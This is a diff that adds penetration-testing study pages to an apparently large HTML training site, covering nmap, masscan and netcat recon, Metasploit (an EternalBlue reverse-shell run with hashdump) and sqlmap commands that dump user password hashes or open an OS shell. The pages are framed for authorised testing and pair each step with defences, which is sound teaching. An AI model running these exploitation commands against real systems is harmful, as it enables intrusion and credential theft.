@@ -71,6 +71,7 @@
 .theme-docker      { --accent-raw:#1d74c4; }
 .theme-k8s         { --accent-raw:#3f5ecc; }
 .theme-debug       { --accent-raw:#8c4a4a; }
+.theme-pentest     { --accent-raw:#6d5a9c; }
 [class*="theme-"] {
   --accent:      var(--accent-raw);
   --accent-soft: color-mix(in srgb, var(--accent) 20%, var(--mix-base));
@@ -41220,6 +41221,955 @@ Two passes. <strong>Pass 1 &mdash; discovery</strong>: <code>nmap -sn -n -PE -PS
 </section>
 <!-- /TOPIC:debug:nmap -->
 
+<!-- ============================== NETWORK HACKING & PENTEST TOPICS ============================== -->
+
+<!-- TOPIC:pentest:recon-scanning -->
+<section class="view topic" id="v-pentest-recon-scanning" data-skill="pentest">
+<div class="layout">
+<nav class="sidebar" data-sidebar="pentest"></nav>
+<div class="topic-body">
+<h1>Recon &amp; Scanning: nmap, masscan, netcat</h1>
+<p class="subtitle">Map the attack surface before touching it: which hosts are up, which ports are open, what is listening, and what version it is &mdash; on scope you are authorised to test.</p>
+
+<details class="section" open><summary>Notes</summary><div class="section-body">
+<figure class="diagram">
+<svg viewBox="0 0 520 155" role="img" aria-labelledby="d-pt-recon-t">
+<title id="d-pt-recon-t">Recon pipeline: authorise scope, sweep fast with masscan, enumerate with nmap, probe with netcat</title>
+<rect class="d-box-alt" x="8" y="26" width="96" height="26" rx="4"/><text class="d-t-sm" x="56" y="43" text-anchor="middle">scope + auth</text>
+<rect class="d-box" x="116" y="26" width="96" height="26" rx="4"/><text class="d-t-sm" x="164" y="43" text-anchor="middle">masscan (fast)</text>
+<rect class="d-box" x="224" y="26" width="110" height="26" rx="4"/><text class="d-t-sm" x="279" y="43" text-anchor="middle">nmap -sV -sC</text>
+<rect class="d-box" x="346" y="26" width="96" height="26" rx="4"/><text class="d-t-sm" x="394" y="43" text-anchor="middle">nc probe</text>
+<rect class="d-box-alt" x="454" y="26" width="58" height="26" rx="4"/><text class="d-t-b" x="483" y="43" text-anchor="middle">notes</text>
+<path class="d-line" d="M104 39 L114 39" marker-end="url(#pt-recon-ah)"/><path class="d-line" d="M212 39 L222 39" marker-end="url(#pt-recon-ah)"/>
+<path class="d-line" d="M334 39 L344 39" marker-end="url(#pt-recon-ah)"/><path class="d-line" d="M442 39 L452 39" marker-end="url(#pt-recon-ah)"/>
+<defs><marker id="pt-recon-ah" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="d-fill" d="M0 0 L8 4 L0 8 Z"/></marker></defs>
+<text class="d-t-sm" x="8" y="86">masscan finds <tspan class="d-t-b">open ports fast</tspan> across huge ranges; nmap then does <tspan class="d-t-b">accurate</tspan> version/OS/script work on just those.</text>
+<text class="d-t-sm" x="8" y="104">netcat is the manual probe: connect, send a byte, read the banner, or stand up a quick listener.</text>
+<text class="d-t-sm" x="8" y="126"><tspan class="d-t-b">Only scan systems you own or have written authorisation to test</tspan> (engagement, CTF range, your lab). Unsanctioned scanning is often illegal.</text>
+</svg>
+<figcaption>This is the offensive-recon view; the Debug skill's nmap topic covers the same tool from an ops/firewall-verification angle. The defensive mirror of everything here is asset inventory + attack-surface monitoring + egress/ingress filtering.</figcaption>
+</figure>
+
+<h3>Ground rules first</h3>
+<p><strong>What / why.</strong> Recon is loud and legally sensitive. Before any packet: have the scope (IP ranges, domains, hours, excluded systems) in writing; stay inside it; log what you run and when; avoid fragile devices (OT/SCADA, printers, medical); coordinate with the blue team so your scan is not mistaken for an incident.</p>
+<pre># keep an evidence trail
+$ SCOPE="10.10.10.0/24"                 # exactly what the authorisation says, nothing more
+$ mkdir -p engagement/scans &amp;&amp; cd engagement/scans
+$ script -q -c 'bash' recon-$(date +%F).log   # record the whole session
+# out-of-scope? stop. New target discovered mid-engagement -> confirm it's in scope first.</pre>
+
+<h3>nmap &mdash; discovery and enumeration</h3>
+<p><strong>What / why.</strong> The standard tool: host discovery, port scanning, service/version detection, OS fingerprinting, and the NSE script engine for deeper enumeration. Two-phase is normal &mdash; a quick sweep, then a focused scan of what answered.</p>
+<pre>$ nmap -sn 10.10.10.0/24 -oA sweep            # ping sweep: which hosts are up
+$ nmap -Pn -sS --top-ports 1000 -T3 -oA quick -iL live.txt   # top-1000 SYN scan of live hosts
+$ nmap -Pn -sS -sV -sC -O -p- -T4 --min-rate 800 10.10.10.7 -oA full   # full port + version + default scripts + OS
+$ nmap -sU --top-ports 50 10.10.10.7          # UDP (DNS/SNMP/NTP/SNMP) - slow, do it targeted
+
+# NSE for enumeration (safe/default categories in an authorised test):
+$ nmap --script "default,safe,discovery" -p 80,443 10.10.10.7
+$ nmap --script "http-title,http-headers,http-enum,http-methods" -p 80,443 10.10.10.7
+$ nmap --script "smb-os-discovery,smb-enum-shares,smb-protocols" -p 445 10.10.10.7
+$ nmap --script "ssl-enum-ciphers,ssl-cert" -p 443 10.10.10.7
+$ nmap --script "vuln" -p 80,443 10.10.10.7   # 'vuln' category is intrusive - only in-scope, coordinate
+
+# port states:  open = listening   closed = reachable, nothing there   filtered = a firewall dropped it
+$ ndiff full.xml full-later.xml               # diff two scans to spot changes over the engagement</pre>
+
+<h3>masscan &mdash; speed at scale</h3>
+<p><strong>What / why.</strong> An asynchronous scanner with its own TCP/IP stack; it can sweep very large ranges for open ports far faster than nmap, but it does little beyond "port open?". Use it to find the ports, then hand them to nmap for accurate identification. It is aggressive by default &mdash; the rate must be tuned.</p>
+<pre># find open ports fast, then enumerate with nmap
+$ sudo masscan -p1-65535 10.10.10.0/24 --rate 2000 -oL masscan.txt --wait 3
+$ sudo masscan -p80,443,8080,8443 10.10.0.0/16 --rate 5000 --banners -oJ web.json
+# --rate is packets/sec: too high melts links, trips IDS, and drops results. Start low on shared networks.
+# --exclude / --excludefile to honour out-of-scope hosts. --shard to split work across boxes.
+# feed masscan's open ports into nmap:
+$ ports=$(grep -oP 'port \K[0-9]+' masscan.txt | sort -un | paste -sd,)
+$ nmap -Pn -sV -sC -p "$ports" -iL targets.txt -oA masscan-followup
+# NB masscan and nmap can conflict if the host firewall/conntrack sees both; run sequentially.</pre>
+
+<h3>netcat (nc) &mdash; the manual probe</h3>
+<p><strong>What / why.</strong> A raw TCP/UDP read/write tool: grab a banner, hand-speak a protocol, port-scan a few ports, redirect a port, or stand up a quick listener for file transfer or a callback in a lab. Note there are several implementations (traditional, OpenBSD, ncat) with different flags &mdash; ncat (from nmap) is the most capable and has TLS.</p>
+<pre>$ nc -nv 10.10.10.7 22                        # connect + see the SSH banner
+$ printf 'HEAD / HTTP/1.0\r\n\r\n' | nc -nv 10.10.10.7 80   # manual HTTP request
+$ nc -znv 10.10.10.7 20-25                    # quick connect-scan of a small port range (-z = no data)
+$ nc -nvu 10.10.10.7 161                      # UDP probe
+
+# lab file transfer:
+receiver$ nc -lvnp 4444 &gt; file.bin
+sender$   nc -nv 10.10.10.5 4444 &lt; file.bin
+
+# ncat extras (TLS, allow-list, exec is disabled in modern builds for safety):
+$ ncat --ssl -nv 10.10.10.7 443
+$ ncat -lvnp 8000 --allow 10.10.10.5         # listener restricted to one source
+# 'nc -e' (command execution) is removed from most distros' netcat - by design.</pre>
+
+<h3>Where this fits &mdash; and the defensive mirror</h3>
+<ul>
+<li><strong>Used in</strong>: authorised network penetration tests and red-team recon, CTF/lab enumeration (HTB, TryHackMe, PortSwigger), your own infrastructure audits, and pre-migration inventory.</li>
+<li><strong>Blue-team view</strong>: scans show up as bursts of SYNs to many ports/hosts from one source &mdash; detectable with IDS (port-scan signatures), NetFlow/Zeek, and connection-rate alerting. Defences: minimise exposed services, default-deny ingress/egress, segment the network, rate-limit and tarpit, and run your <em>own</em> continuous attack-surface scans so you find the open port before someone else does.</li>
+<li><strong>Not</strong>: scanning third parties without authorisation, or blasting <code>--rate</code>/<code>-T5</code> at production or fragile devices.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Cheat Sheet</summary><div class="section-body">
+<ul>
+<li>Authorisation + scope in writing before any packet. Log the session. Avoid fragile devices. Coordinate with defenders.</li>
+<li><strong>nmap</strong>: <code>-sn</code> sweep &rarr; <code>-Pn -sS --top-ports 1000</code> quick &rarr; <code>-sS -sV -sC -O -p-</code> full; <code>-sU --top-ports</code> for UDP; <code>-oA</code> always; <code>ndiff</code> to compare.</li>
+<li>NSE: <code>--script "default,safe,discovery"</code>; targeted (<code>http-enum</code>, <code>smb-enum-shares</code>, <code>ssl-enum-ciphers</code>); <code>--script vuln</code> is intrusive &mdash; coordinate.</li>
+<li><strong>masscan</strong>: <code>-p1-65535 &lt;range&gt; --rate N -oL/-oJ</code> for a fast open-port sweep; tune <code>--rate</code> down on shared links; <code>--exclude</code> out-of-scope; then feed ports to <code>nmap -sV</code>.</li>
+<li><strong>nc / ncat</strong>: <code>nc -nv host port</code> banner; <code>-z</code> connect-scan; <code>-u</code> UDP; <code>-lvnp</code> listener; <code>ncat --ssl</code>, <code>--allow</code>; <code>nc -e</code> is removed on purpose.</li>
+<li>Port states: <strong>open</strong> / <strong>closed</strong> / <strong>filtered</strong> (firewall dropped it).</li>
+<li>Defensive mirror: asset inventory, default-deny, segmentation, IDS/NetFlow, rate-limit/tarpit, run your own recurring scans.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Q&amp;A</summary><div class="section-body">
+<dl class="qa">
+<dt>Why run masscan and nmap together instead of just one?</dt>
+<dd>They optimise for different things. <strong>masscan</strong> is asynchronous with its own stack &mdash; it can find open ports across a /16 in minutes, but it barely identifies the service and is easy to misconfigure into flooding a link. <strong>nmap</strong> is accurate &mdash; real version detection, OS fingerprinting, NSE enumeration &mdash; but scanning all 65k ports on many hosts with it is slow. So: masscan to discover <em>which</em> ports are open fast, then nmap <code>-sV -sC</code> on exactly that port list for the detail you actually act on.</dd>
+<dt>What do the port states open, closed, and filtered mean, and which one implies a firewall?</dt>
+<dd><strong>open</strong>: something accepted the probe (SYN-ACK) &mdash; a service is listening. <strong>closed</strong>: the host replied that nothing is listening there (RST) &mdash; reachable, no filter in the way for that port. <strong>filtered</strong>: no useful reply (probe silently dropped, or ICMP admin-prohibited) &mdash; a firewall or filter is blocking it and nmap can't tell if a service is behind it. So <em>filtered</em> is the firewall indicator; <em>closed</em> means the packet got through but hit nothing.</dd>
+<dt>What is netcat's <code>-z</code> flag and when would you use it over nmap?</dt>
+<dd><code>-z</code> ("zero-I/O") makes nc just test whether a connection can be established and then close it &mdash; a lightweight connect scan. You'd use it for a quick check of a handful of ports on one host from a box where nmap isn't installed (a limited shell on a target, a minimal container), or inside a script. For anything real &mdash; many ports/hosts, version detection, accuracy, timing control &mdash; use nmap.</dd>
+<dt>You discover a live host mid-engagement that wasn't in the original target list. What do you do?</dt>
+<dd>Stop and confirm scope before touching it. Discovering a host doesn't authorise testing it &mdash; it might be a third party's system on a shared segment, out-of-scope by agreement, or a sensitive device. Note it, report it to the engagement contact, and get explicit written confirmation that it's in scope before scanning or interacting further. Testing outside the authorised scope can be a legal problem and breaks the rules of engagement.</dd>
+<dt>Why is <code>nc -e</code> missing from most Linux distributions' netcat?</dt>
+<dd>Because <code>-e</code> pipes a program's stdio to the socket &mdash; the classic one-liner bind/reverse shell &mdash; and shipping that by default was considered too dangerous a footgun. Distros build the "GNU"/"traditional" netcat without <code>-e</code> (or ship OpenBSD nc, which never had it). Legitimate uses that need it use ncat (with restrictions), <code>socat</code>, or explicit shell redirection; the point is it's an opt-in, not a default.</dd>
+</dl>
+</div></details>
+
+<details class="section"><summary>Interview Questions</summary><div class="section-body">
+<div class="qlevel">
+<h4>Basic <span class="lvl-tag">warm-up</span></h4>
+<details class="answer-reveal"><summary>What must you have before scanning any network?</summary><div class="answer-box">
+Written authorisation defining the scope (IP ranges/domains, timing, exclusions) &mdash; from the system owner or an engagement contract, or it's your own lab / a sanctioned CTF range. Unauthorised scanning of third-party systems can violate computer-misuse law.
+</div></details>
+<details class="answer-reveal"><summary>Which tool would you use to grab a service banner from a single port, quickly, with nothing else installed?</summary><div class="answer-box">
+<code>netcat</code>: <code>nc -nv &lt;host&gt; &lt;port&gt;</code> connects and shows whatever the service sends first (SSH/FTP/SMTP banners, etc.).
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Intermediate <span class="lvl-tag">core</span></h4>
+<details class="answer-reveal"><summary>Design an efficient, low-noise recon workflow for a /22 you're authorised to test on a shared corporate network.</summary><div class="answer-box">
+<strong>Phase 0</strong>: confirm scope and exclusions in writing; notify the SOC of the window; start a session log; identify and exclude fragile ranges (OT, printers, VoIP). <strong>Phase 1 &mdash; discovery</strong>: <code>nmap -sn -n -PE -PS22,80,443,3389 -PA80 --min-rate 200 -oA sweep 10.x.0.0/22</code> &mdash; a few TCP probes so firewalled-but-up hosts still answer, no reverse DNS, gentle rate. <strong>Phase 2 &mdash; fast port sweep</strong> of live hosts: either <code>nmap -Pn -sS --top-ports 1000 -T3 --max-retries 1 -iL live.txt -oA quick</code>, or masscan at a <em>low</em> rate (<code>--rate 500</code>) with <code>--excludefile</code> and <code>-oL</code> if the range is big &mdash; on a shared network prefer nmap <code>-T3</code> to stay polite. <strong>Phase 3 &mdash; targeted enumeration</strong>: for each host, <code>nmap -Pn -sS -sV -sC -O -p &lt;discovered-ports&gt; -T3 --scan-delay 0 -oA host-&lt;ip&gt;</code>; add safe NSE scripts per service (<code>http-enum</code>, <code>smb-enum-shares</code>, <code>ssl-enum-ciphers</code>). Save <code>vuln</code>-category scripts for explicitly agreed hosts. <strong>Phase 4 &mdash; manual</strong>: <code>nc</code>/<code>curl</code> to confirm interesting findings by hand and capture exact banners/responses as evidence. Keep timing at <code>-T3</code>, cap <code>--min-rate</code>, spread work over time, and diff scans with <code>ndiff</code> if you re-run. Net: gentle discovery &rarr; port sweep &rarr; per-service enumeration &rarr; manual confirmation, all logged and scoped.</dd>
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Advanced <span class="lvl-tag">deep</span></h4>
+<details class="answer-reveal"><summary>You're on the blue team. Design detection and mitigation for exactly the recon activity these tools perform.</summary><div class="answer-box">
+<strong>Reduce the surface first</strong>: authoritative asset inventory (feed from cloud/IPAM), default-deny ingress and <em>egress</em> at segment boundaries, network segmentation/microsegmentation so a foothold can't sweep the whole estate, and your own recurring external + internal scans (nmap/masscan or a commercial ASM) with alerting on new open ports so you find exposure before an attacker does. <strong>Detection</strong>: (1) IDS/IPS (Suricata/Snort) port-scan and NSE-signature rules; (2) flow analysis (Zeek, NetFlow/IPFIX, cloud VPC flow logs) &mdash; alert on one source touching many distinct destination IPs or many distinct ports in a short window, high SYN-without-ACK ratios, and connections to ports with no listener (which imply scanning); (3) honeypots / honey-ports / a tarpit &mdash; any interaction with an unused IP or port is high-fidelity malicious; (4) host telemetry (EDR / auditd / Sysmon-for-Linux) for <code>nmap</code>/<code>masscan</code>/<code>nc</code> process execution and raw-socket usage on servers that should never run them; (5) DNS/passive-DNS spikes and reverse-lookup storms. <strong>Mitigation / response</strong>: rate-limit and connection-throttle at the firewall; SYN-cookies and per-source connection caps; drop (don't reject) closed ports so scans are slow and inconclusive; tarpit suspicious sources (LaBrea / iptables TARPIT-style); auto-quarantine a source that trips scan thresholds (NAC / dynamic ACL) with an analyst review; block known scanner infrastructure. <strong>Context</strong>: correlate with change tickets and the pentest schedule so an authorised assessment isn't a 2am page &mdash; but still record it. <strong>Metrics</strong>: time-to-detect a scan, number of exposed services trending down, and coverage of segments by flow monitoring. The goal isn't to stop scanning (you can't) &mdash; it's to have almost nothing to find, and to know immediately when someone looks.</dd>
+</div></details>
+</div>
+</div></details>
+
+</div></div>
+</section>
+<!-- /TOPIC:pentest:recon-scanning -->
+
+<!-- TOPIC:pentest:exploitation -->
+<section class="view topic" id="v-pentest-exploitation" data-skill="pentest">
+<div class="layout">
+<nav class="sidebar" data-sidebar="pentest"></nav>
+<div class="topic-body">
+<h1>Exploitation Frameworks: Metasploit &amp; sqlmap</h1>
+<p class="subtitle">Metasploit turns "known vulnerability" into a repeatable module workflow; sqlmap automates finding and pulling data through SQL-injection flaws &mdash; both only against systems you are authorised to test.</p>
+
+<details class="section" open><summary>Notes</summary><div class="section-body">
+<figure class="diagram">
+<svg viewBox="0 0 520 150" role="img" aria-labelledby="d-pt-expl-t">
+<title id="d-pt-expl-t">Metasploit module workflow and sqlmap injection workflow</title>
+<rect class="d-box-alt" x="10" y="18" width="150" height="18"/><text class="d-t-sm" x="18" y="31">search &rarr; use module</text>
+<rect class="d-box-alt" x="10" y="40" width="150" height="18"/><text class="d-t-sm" x="18" y="53">set RHOSTS / options</text>
+<rect class="d-box-alt" x="10" y="62" width="150" height="18"/><text class="d-t-sm" x="18" y="75">set PAYLOAD / LHOST</text>
+<rect class="d-box" x="10" y="84" width="150" height="18"/><text class="d-t-sm" x="18" y="97">check &rarr; run</text>
+<rect class="d-box-soft" x="200" y="50" width="110" height="26" rx="6"/><text class="d-t-b" x="255" y="67" text-anchor="middle">session / shell</text>
+<rect class="d-box" x="350" y="18" width="160" height="18"/><text class="d-t-sm" x="358" y="31">sqlmap -u / --data / -r</text>
+<rect class="d-box" x="350" y="40" width="160" height="18"/><text class="d-t-sm" x="358" y="53">--level --risk (detect)</text>
+<rect class="d-box" x="350" y="62" width="160" height="18"/><text class="d-t-sm" x="358" y="75">--dbs --tables --dump</text>
+<rect class="d-box-soft" x="350" y="86" width="160" height="18"/><text class="d-t-sm" x="358" y="99">--os-shell (if permitted)</text>
+<path class="d-line" d="M160 90 L198 66" marker-end="url(#pt-expl-ah)"/>
+<defs><marker id="pt-expl-ah" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="d-fill" d="M0 0 L8 4 L0 8 Z"/></marker></defs>
+<text class="d-t-sm" x="10" y="122">Both are <tspan class="d-t-b">force multipliers for known issues</tspan>, not magic. Every option and payload should map to the rules of engagement.</text>
+<text class="d-t-sm" x="10" y="140">Defensive mirror: patch management, WAF, parameterised queries, least-privilege DB users, EDR, egress filtering.</text>
+</svg>
+<figcaption>Study these for AppSec / red-team / OSCP-style interviews and for authorised assessments and CTFs. The most useful interview answers pair the offensive step with the control that stops it.</figcaption>
+</figure>
+
+<h3>Metasploit: what it is</h3>
+<p><strong>What / why.</strong> A framework of ~2,000+ exploit modules, ~1,300 auxiliary modules (scanners, fuzzers, brute-forcers), payloads, encoders, and post-exploitation modules, driven from <code>msfconsole</code>. It standardises the "select a known exploit &rarr; set target &rarr; set payload &rarr; run &rarr; get a session" loop, plus a database to track hosts/services/loot across an engagement.</p>
+<pre>$ msfdb init &amp;&amp; msfconsole -q
+msf6 &gt; workspace -a client-x            # isolate this engagement's data
+msf6 &gt; db_nmap -sV -sC 10.10.10.7       # nmap results land in the workspace DB
+msf6 &gt; hosts ; services ; vulns         # what we know so far
+
+msf6 &gt; search type:exploit platform:windows smb                 # find a module
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue            # (lab example)
+msf6 &gt; info                              # description, options, targets, references (CVE)
+msf6 &gt; show options ; show targets
+msf6 &gt; set RHOSTS 10.10.10.7
+msf6 &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 &gt; set LHOST 10.10.14.5 ; set LPORT 4444
+msf6 &gt; check                             # non-invasive "is it vulnerable?" where supported
+msf6 &gt; run                               # or 'exploit'
+meterpreter &gt; getuid ; sysinfo ; hashdump
+msf6 &gt; sessions -l ; sessions -i 1 ; background</pre>
+
+<h3>Metasploit: the pieces</h3>
+<table>
+<tr><th>Concept</th><th>What it is</th></tr>
+<tr><td><strong>exploit</strong> module</td><td>Code that triggers a specific vulnerability (usually tied to a CVE) to run a payload.</td></tr>
+<tr><td><strong>auxiliary</strong> module</td><td>No payload &mdash; scanners, login brute-forcers, protocol fuzzers, DoS (out of scope for most tests), enumeration.</td></tr>
+<tr><td><strong>payload</strong></td><td>What runs after exploitation. <em>Staged</em> (small stub pulls the rest) vs <em>stageless</em>; <em>bind</em> (listen on target) vs <em>reverse</em> (call back to you).</td></tr>
+<tr><td><strong>Meterpreter</strong></td><td>An in-memory post-exploitation payload: file ops, <code>ps</code>/<code>migrate</code>, <code>hashdump</code>, pivoting (<code>route</code>, <code>portfwd</code>), <code>getsystem</code>, screenshot.</td></tr>
+<tr><td><strong>encoder</strong> / <strong>NOP</strong></td><td>Historically for AV/IDS evasion &amp; bad-char avoidance; modern AV defeats simple encoding &mdash; largely a legacy concept.</td></tr>
+<tr><td><strong>post</strong> module</td><td>Runs against an existing session: local enumeration, privesc checks, credential harvesting, persistence (persistence needs explicit authorisation).</td></tr>
+<tr><td><strong>msfvenom</strong></td><td>Standalone payload generator: <code>msfvenom -p &lt;payload&gt; LHOST=.. LPORT=.. -f &lt;fmt&gt; -o out</code>.</td></tr>
+<tr><td><strong>handler</strong></td><td><code>use exploit/multi/handler</code> &mdash; catches a callback from a payload you delivered another way.</td></tr>
+</table>
+
+<h3>sqlmap: automated SQL injection</h3>
+<p><strong>What / why.</strong> Given a request that reaches a database, sqlmap detects whether a parameter is injectable, identifies the DBMS and technique (boolean/error/time/UNION/stacked), and then automates enumeration and data extraction &mdash; and, where the config allows, file read/write or an OS shell. Point it at your own app, a lab (DVWA, bWAPP, HTB), or an in-scope target.</p>
+<pre># give it a real request (a saved Burp request file is the most reliable)
+$ sqlmap -r request.txt -p username --batch --level 3 --risk 2
+
+# or by URL / POST body / cookie
+$ sqlmap -u 'https://app.test/item?id=1' --dbs
+$ sqlmap -u 'https://app.test/login' --data 'user=a&amp;pass=b' -p user
+$ sqlmap -u 'https://app.test/' --cookie 'sid=...; role=user' --level 2
+
+# once a param is confirmed injectable:
+$ sqlmap -r request.txt -p id --dbms mysql --current-user --current-db --is-dba
+$ sqlmap -r request.txt -p id -D appdb --tables
+$ sqlmap -r request.txt -p id -D appdb -T users --columns
+$ sqlmap -r request.txt -p id -D appdb -T users -C username,password_hash --dump
+
+# useful flags:
+#   --batch            answer prompts with defaults (non-interactive)
+#   --level 1..5        how many places/params to test (headers, cookies at higher levels)
+#   --risk 1..3         how dangerous the test payloads are (3 can include OR-based / stacked)
+#   --technique BEUSTQ  restrict to Boolean/Error/Union/Stacked/Time/inline-Query
+#   --threads 5         parallelism (careful on prod)
+#   --tamper=space2comment,between   evasion scripts (only where the RoE permits)
+#   --proxy http://127.0.0.1:8080    route via Burp for logging/inspection
+#   --flush-session     re-test from scratch;  -v3  see the payloads it sends
+#   --os-shell / --sql-shell / --file-read   post-exploitation - only if explicitly authorised</pre>
+
+<h3>Where this fits &mdash; and the defence for each</h3>
+<ul>
+<li><strong>Used in</strong>: authorised web-app and infrastructure penetration tests, red-team engagements, OSCP/PNPT-style exams, CTFs, and vendor/researcher PoC validation. Metasploit is also a <em>defensive</em> tool &mdash; blue teams use it to validate that a patch actually closed a hole and to build detections.</li>
+<li><strong>Defeating Metasploit exploitation</strong>: timely patching / vulnerability management (most modules target old CVEs), network segmentation and egress filtering (breaks reverse shells), application allow-listing and EDR (catches Meterpreter and <code>getsystem</code>), disabling unused services, and least privilege so a foothold isn't game over.</li>
+<li><strong>Defeating sqlmap / SQLi</strong>: <strong>parameterised queries / prepared statements</strong> everywhere (the real fix), an ORM used safely, input validation as defence-in-depth, a least-privilege DB account (no <code>FILE</code>, no DBA, per-app schema), a WAF as a speed bump not a fix, and query/error logging + alerting on injection signatures. Never build SQL by string concatenation.</li>
+<li><strong>Not</strong>: running exploits or <code>--os-shell</code>/<code>--dump</code> against systems outside your authorised scope, deploying persistence without sign-off, or using evasion features to attack third parties.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Cheat Sheet</summary><div class="section-body">
+<ul>
+<li><strong>msfconsole loop</strong>: <code>search</code> &rarr; <code>use &lt;module&gt;</code> &rarr; <code>info</code>/<code>show options</code> &rarr; <code>set RHOSTS</code> &rarr; <code>set PAYLOAD</code> + <code>LHOST/LPORT</code> &rarr; <code>check</code> &rarr; <code>run</code> &rarr; <code>sessions -i</code>.</li>
+<li>Modules: <strong>exploit</strong> (triggers a CVE), <strong>auxiliary</strong> (scan/brute/fuzz, no payload), <strong>post</strong> (against a session), <strong>payload</strong> (bind vs reverse, staged vs stageless), <strong>Meterpreter</strong> (in-memory post-ex), <strong>msfvenom</strong> (payload files), <code>multi/handler</code> (catch callbacks).</li>
+<li>Use <code>workspace</code> + <code>db_nmap</code> to keep engagement data together; <code>hosts</code>/<code>services</code>/<code>loot</code>/<code>creds</code>.</li>
+<li><strong>sqlmap</strong>: feed a saved request &mdash; <code>sqlmap -r req.txt -p &lt;param&gt; --batch --level 3 --risk 2</code>; then <code>--dbs</code> &rarr; <code>-D db --tables</code> &rarr; <code>-T t --columns</code> &rarr; <code>-C ... --dump</code>.</li>
+<li>sqlmap knobs: <code>--technique</code>, <code>--dbms</code>, <code>--threads</code>, <code>--tamper</code> (evasion, RoE-gated), <code>--proxy</code> (via Burp), <code>-v3</code> (see payloads), <code>--flush-session</code>.</li>
+<li><code>--os-shell</code>/<code>--sql-shell</code>/<code>--file-read</code>/<code>--dump</code> and MSF persistence = only with explicit authorisation.</li>
+<li>Defences: patch mgmt + segmentation + EDR + least privilege (MSF); <strong>parameterised queries</strong> + least-priv DB user + WAF + logging (SQLi).</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Q&amp;A</summary><div class="section-body">
+<dl class="qa">
+<dt>In Metasploit, what's the difference between an <code>exploit</code> module and an <code>auxiliary</code> module?</dt>
+<dd>An <strong>exploit</strong> module triggers a specific vulnerability and delivers a <strong>payload</strong> (so it can give you code execution / a session). An <strong>auxiliary</strong> module has no payload &mdash; it's for scanning, service/version enumeration, login brute-forcing, protocol fuzzing, gathering info, or (rarely, and usually out of scope) DoS. You often run auxiliary scanners first to confirm a target is vulnerable, then use the matching exploit.</dd>
+<dt>Bind shell vs reverse shell &mdash; when does each work?</dt>
+<dd>A <strong>bind</strong> payload opens a listening port <em>on the target</em> and you connect in &mdash; only works if you can reach that new port (no inbound firewall/NAT between you and the target). A <strong>reverse</strong> payload makes the target connect <em>back to you</em> (<code>LHOST</code>/<code>LPORT</code>) &mdash; works when the target has outbound access even though inbound is blocked, which is the common case. That's why reverse shells are the default, and why <strong>egress filtering</strong> is such an effective defence: block/inspect outbound and the callback fails.</dd>
+<dt>sqlmap says a parameter is "not injectable" but you're fairly sure it is. What do you try?</dt>
+<dd>(1) Feed it a <strong>complete real request</strong> (<code>-r request.txt</code> saved from Burp) so all headers/cookies/tokens are correct, and name the exact parameter with <code>-p</code>. (2) Raise coverage: <code>--level 5 --risk 3</code> (tests more places &mdash; headers, cookies, JSON &mdash; and more aggressive payloads). (3) Hint the backend: <code>--dbms</code>, <code>--technique</code>, <code>--prefix</code>/<code>--suffix</code> if the injection needs to break out of a quoting context. (4) Handle app logic: <code>--csrf-token</code>/<code>--csrf-url</code> for anti-CSRF, <code>--random-agent</code>, <code>--delay</code>/<code>--time-sec</code> if a WAF or rate limit is interfering, and <code>--tamper</code> scripts if allowed. (5) <code>-v3</code> to see the actual payloads and the responses &mdash; you may spot it's a second-order injection (input stored then used elsewhere) that sqlmap can't chain automatically, or that it's not SQL at all (NoSQL, LDAP). (6) Test the concept manually first (<code>' OR '1'='1</code>, a time delay) to confirm before automating.</dd>
+<dt>What's the single most effective defence against everything sqlmap does?</dt>
+<dd><strong>Parameterised queries / prepared statements</strong> (or an ORM that uses them correctly) &mdash; the query structure is fixed and user input is only ever bound as data, so it can't change the SQL. That eliminates the vulnerability class itself. Everything else (WAF, input validation, least-privilege DB user, error suppression) is defence-in-depth that limits impact or raises effort, not a fix. A least-privilege DB account (no <code>FILE</code> privilege, not DBA, scoped to one schema) specifically kills sqlmap's <code>--file-read/-write</code>, <code>--os-shell</code>, and cross-database dumping even if an injection exists.</dd>
+<dt>Why do experienced testers say Metasploit "isn't a substitute for understanding the exploit"?</dt>
+<dd>Because a module can fail or misbehave in ways you can't diagnose or safely handle without knowing what it does: wrong target/offset can crash the service (availability impact you didn't authorise), a payload can be caught by EDR and tip off the blue team, <code>check</code> isn't always accurate, and some modules are memory-corruption exploits that are one-shot or leave the service unstable. Certs like OSCP restrict Metasploit for this reason &mdash; you're expected to understand the vuln, pick the right target, know the blast radius, and be able to exploit by hand. Metasploit is a great accelerator once you know what you're launching.</dd>
+</dl>
+</div></details>
+
+<details class="section"><summary>Interview Questions</summary><div class="section-body">
+<div class="qlevel">
+<h4>Basic <span class="lvl-tag">warm-up</span></h4>
+<details class="answer-reveal"><summary>What does <code>set PAYLOAD</code> control in Metasploit?</summary><div class="answer-box">
+What code runs on the target after the exploit succeeds &mdash; e.g. a simple command shell, or Meterpreter (in-memory post-exploitation), and whether it's a bind listener on the target or a reverse connection back to your <code>LHOST</code>/<code>LPORT</code>.
+</div></details>
+<details class="answer-reveal"><summary>What is the correct order of sqlmap operations to reach a specific table's data?</summary><div class="answer-box">
+Confirm the injectable parameter &rarr; <code>--dbs</code> (list databases) &rarr; <code>-D &lt;db&gt; --tables</code> &rarr; <code>-D &lt;db&gt; -T &lt;table&gt; --columns</code> &rarr; <code>-D &lt;db&gt; -T &lt;table&gt; -C &lt;cols&gt; --dump</code>. Only against a target you're authorised to test.
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Intermediate <span class="lvl-tag">core</span></h4>
+<details class="answer-reveal"><summary>You get a Meterpreter session as a low-privileged user on a lab Windows host. Outline safe next steps and their defensive countermeasures.</summary><div class="answer-box">
